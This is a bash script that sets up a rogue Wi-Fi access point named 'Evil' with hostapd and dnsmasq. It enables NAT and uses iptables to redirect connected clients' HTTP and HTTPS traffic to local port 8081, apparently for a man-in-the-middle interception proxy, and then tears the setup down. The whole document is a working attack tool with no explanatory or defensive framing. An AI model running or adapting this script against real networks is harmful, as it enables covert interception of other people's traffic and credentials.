#!/bin/bash
# Variables
eth=$1
wlan=$2
# Check parameters
if [[ $# -ne 2 ]]; then
	echo "Usage: $0 wiredinterface wirelessinterface"
	exit 1
else
	echo "2 arguments found"
fi

# Check prereqs
prereqs="dnsmasq hostapd"
for pkg in $prereqs ; do
	if dpkg --get-selections | grep -q "^$pkg[[:space:]]*install$" > /dev/null; then
		echo "Package $pkg is installed"
	else
		if apt-get -qq install $pkg; then
			echo "Succesfully installed $pkg"
		else
			echo "Error installing $pkg"
		fi
	fi
done
echo "All prerequirements are installed"

# /etc/rap-hostapd.conf
cat >/etc/rap-hostapd.conf <<EOF
interface=$wlan
driver=nl80211
ssid=Evil
hw_mode=g
channel=6
wpa=2
wpa_passphrase=Welkom01
EOF

# Check network-manager service
service="NetworkManager"
if ps ax | grep -v grep | grep "NetworkManager" > /dev/null; then
	service network-manager stop
	echo "NetworkManager stopped"
fi

# Start
# Configure IP address for WLAN
ifconfig $wlan 192.168.101.1
# Start DHCP/DNS server
service dnsmasq stop
dnsmasq --bind-interfaces --interface=$wlan --dhcp-range=192.168.101.2,192.168.101.250 --dhcp-option=3,192.168.101.1
# Enable routing
sysctl net.ipv4.ip_forward=1
# Enable NAT
iptables -t nat -A POSTROUTING -o $eth -j MASQUERADE
iptables --append FORWARD --in-interface $wlan -j ACCEPT
iptables -t nat -A PREROUTING -i $wlan -p tcp --dport 80  -j REDIRECT --to-port 8081
iptables -t nat -A PREROUTING -i $wlan -p tcp --dport 8080  -j REDIRECT --to-port 8081
iptables -t nat -A PREROUTING -i $wlan -p tcp --dport 443 -j REDIRECT --to-port 8081
iptables -t nat -A PREROUTING -i $wlan -p tcp --dport 8443 -j REDIRECT --to-port 8081
# Run access point daemon
hostapd /etc/rap-hostapd.conf
# Stop
# Cleanup
# Disable NAT
iptables -D POSTROUTING -t nat -o $eth -j MASQUERADE
iptables -t nat -D PREROUTING -i $wlan -p tcp --dport 80  -j REDIRECT --to-port 8081
iptables -t nat -D PREROUTING -i $wlan -p tcp --dport 8080  -j REDIRECT --to-port 8081
iptables --delete FORWARD --in-interface $wlan -j ACCEPT
iptables -t nat -D PREROUTING -i $wlan -p tcp --dport 443 -j REDIRECT --to-port 8081
iptables -t nat -D PREROUTING -i $wlan -p tcp --dport 8443 -j REDIRECT --to-port 8081
## Disable routing
sysctl net.ipv4.ip_forward=0
# Disable DHCP/DNS server
kill $(cat /var/run/dnsmasq.pid)
service hostapd stop
service network-manager start